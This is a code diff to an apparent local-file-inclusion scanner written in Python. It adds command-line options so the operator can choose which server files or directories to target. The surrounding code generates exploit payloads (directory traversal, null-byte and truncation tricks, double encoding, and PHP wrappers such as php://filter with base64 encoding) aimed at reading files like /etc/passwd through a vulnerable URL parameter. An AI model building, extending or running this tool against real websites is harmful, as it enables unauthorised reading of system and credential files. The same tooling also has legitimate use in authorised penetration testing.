@@ -17,6 +17,7 @@ from dataclasses import dataclass
 import warnings
 from urllib.parse import urlparse, parse_qs
 import re
+import os
 
 class Banner:
     @staticmethod
@@ -211,6 +212,11 @@ class PayloadGenerator:
         "unicode",
     ]
     
+    def __init__(self, custom_files: Optional[List[str]] = None):
+        self.custom_files = custom_files or []
+        if self.custom_files:
+            self.FILE_TARGETS = self.custom_files
+    
     @staticmethod
     def apply_encoding(payload: str, encoding: str) -> str:
         if encoding == "urlencode":
@@ -281,13 +287,13 @@ class PayloadGenerator:
         
         return chains
     
-    @staticmethod
-    def generate() -> Generator[str, None, None]:
-        filter_chains = PayloadGenerator.generate_filter_chains()
+    def generate(self) -> Generator[str, None, None]:
+        filter_chains = self.generate_filter_chains()
+        file_targets = self.FILE_TARGETS if hasattr(self, 'FILE_TARGETS') else PayloadGenerator.FILE_TARGETS
         
         for wrapper in PayloadGenerator.BASE_WRAPPERS:
             for traversal in PayloadGenerator.TRAVERSALS:
-                for file_target in PayloadGenerator.FILE_TARGETS:
+                for file_target in file_targets:
                     base_path = f"{traversal}{file_target}"
                     
                     for encoding in PayloadGenerator.ENCODING_TECHNIQUES:
@@ -309,24 +315,24 @@ class PayloadGenerator:
                             yield f"{wrapper}//{encoded_path}"
         
         for traversal in PayloadGenerator.TRAVERSALS:
-            for file_target in PayloadGenerator.FILE_TARGETS:
+            for file_target in file_targets:
                 base_path = f"{traversal}{file_target}"
                 for null_payload in PayloadGenerator.generate_null_byte_payloads(base_path):
                     yield f"php://filter/convert.base64-encode/resource={null_payload}"
         
         for traversal in PayloadGenerator.TRAVERSALS[:5]:
-            for file_target in PayloadGenerator.FILE_TARGETS[:10]:
+            for file_target in file_targets[:10]:
                 base_path = f"{traversal}{file_target}"
                 for trunc_payload in PayloadGenerator.generate_truncation_payloads(base_path):
                     yield trunc_payload
         
-        base_payloads = list(PayloadGenerator.generate_base_payloads())
+        base_payloads = list(self.generate_base_payloads())
         for payload in random.sample(base_payloads, min(100, len(base_payloads))):
             for double_encoded in PayloadGenerator.generate_double_encoding_payloads(payload):
                 yield double_encoded
         
         for traversal in PayloadGenerator.TRAVERSALS[:5]:
-            for file_target in PayloadGenerator.FILE_TARGETS[:10]:
+            for file_target in file_targets[:10]:
                 base_path = f"{traversal}{file_target}"
                 for chain_payload in PayloadGenerator.generate_wrapper_chains(base_path):
                     yield chain_payload
@@ -339,11 +345,11 @@ class PayloadGenerator:
                 chains.append("|".join(combo))
         return chains
     
-    @staticmethod
-    def generate_base_payloads() -> Generator[str, None, None]:
+    def generate_base_payloads(self) -> Generator[str, None, None]:
+        file_targets = self.FILE_TARGETS if hasattr(self, 'FILE_TARGETS') else PayloadGenerator.FILE_TARGETS
         for wrapper in ["php://filter", "file://", "data://"]:
             for traversal in ["../", "..%2f", "%2e%2e/"]:
-                for file_target in ["/etc/passwd", "/etc/hosts"]:
+                for file_target in file_targets[:2]:
                     base_path = f"{traversal}{file_target}"
                     if wrapper == "php://filter":
                         yield f"{wrapper}/convert.base64-encode/resource={base_path}"
@@ -522,7 +528,9 @@ class LFIScanner:
         delay: float = 0.1,
         threads: int = 10,
         method: str = "GET",
-        post_data: Dict = None
+        post_data: Dict = None,
+        target_files: Optional[List[str]] = None,
+        target_dir: Optional[str] = None
     ):
         self.client = client
         self.delay = delay
@@ -534,6 +542,8 @@ class LFIScanner:
         self.tested = 0
         self.start_time = time.time()
         self.lock = threading.Lock()
+        self.target_files = target_files
+        self.target_dir = target_dir
         
         signal.signal(signal.SIGINT, self._handle_stop)
     
@@ -598,9 +608,20 @@ class LFIScanner:
         print(f"\033[96m[*] Parameter: {param}\033[0m")
         print(f"\033[96m[*] Threads: {self.threads}\033[0m")
         print(f"\033[96m[*] Method: {self.method}\033[0m")
+        
+        if self.target_dir:
+            print(f"\033[96m[*] Target directory: {self.target_dir}\033[0m")
+        
+        if self.target_files:
+            print(f"\033[96m[*] Custom files: {', '.join(self.target_files)}\033[0m")
+        
         print()
         
-        payloads = list(PayloadGenerator.generate())
+        payload_generator = PayloadGenerator(
+            custom_files=self.target_files if self.target_files else None
+        )
+        
+        payloads = list(payload_generator.generate())
         print(f"\033[96m[*] Generated {len(payloads)} test payloads\033[0m")
         print()
         
@@ -682,10 +703,28 @@ def main():
     parser.add_argument("--follow-redirects", action="store_true", help="Follow redirects")
     parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
     parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
+    parser.add_argument("--target-file", action="append", help="Specific file to target (can be used multiple times)")
+    parser.add_argument("--target-dir", help="Target directory to read files from (e.g., '/var/www/html/')")
+    parser.add_argument("--target-list", help="File containing list of files to target")
     
     args = parser.parse_args()
     
     Banner.show()
+    
+    target_files = []
+    if args.target_file:
+        target_files.extend(args.target_file)
+    
+    if args.target_list:
+        try:
+            with open(args.target_list, 'r') as f:
+                target_files.extend([line.strip() for line in f if line.strip()])
+        except FileNotFoundError:
+            print(f"\033[91m[!] File not found: {args.target_list}\033[0m")
+            return
+    
+    if args.target_dir:
+        target_files.append(args.target_dir)
     
     cookies = {}
     if args.cookie:
@@ -722,7 +761,9 @@ def main():
         delay=args.delay,
         threads=args.threads,
         method=args.method,
-        post_data=post_data
+        post_data=post_data,
+        target_files=target_files if target_files else None,
+        target_dir=args.target_dir
     )
     
     scanner.scan(args.url, args.param)
